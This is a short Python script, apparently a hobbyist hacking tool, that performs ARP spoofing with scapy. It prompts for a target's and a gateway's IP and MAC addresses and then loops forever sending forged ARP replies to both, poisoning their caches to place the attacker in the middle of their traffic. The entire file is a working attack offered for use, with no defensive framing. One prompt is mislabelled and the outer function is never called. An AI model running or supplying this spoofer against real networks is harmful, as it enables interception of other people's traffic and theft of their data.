#!/usr/bin/env python3
import scapy.all as scapy
import netifaces
import time

from arpspoof_txt import poof
from ip_scanner import ip
poof()
ip()
print("\n****************************************************************")
print("\n* Copyright of saai jeshwanth && nithesh, 2021 *")
print("\n****************************************************************")
def arp():
    def spoof():
        target_ip = input("Enter the target ip :")
        target_mac = input("Enter the target MAC :") 
        default_gateway = input("Enter the Gateway :")
        router = input("Enter the router :")
        router_mac = input("Enter the target MAC :") 
        t_ip = input("Enter the target_ip :")
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=default_gateway)
        packet1 = scapy.ARP(op=2, pdst=router, hwdst=router_mac, psrc=t_ip)
        sent_packets_count = 0
        while True:
            scapy.send(packet, verbose=False)
            scapy.send(packet1, verbose=False)
            sent_packets_count = sent_packets_count + 2
            print("\r[+] Packets sent: " + str(sent_packets_count), end="")
            
            time.sleep(2)
            
        
    spoof()
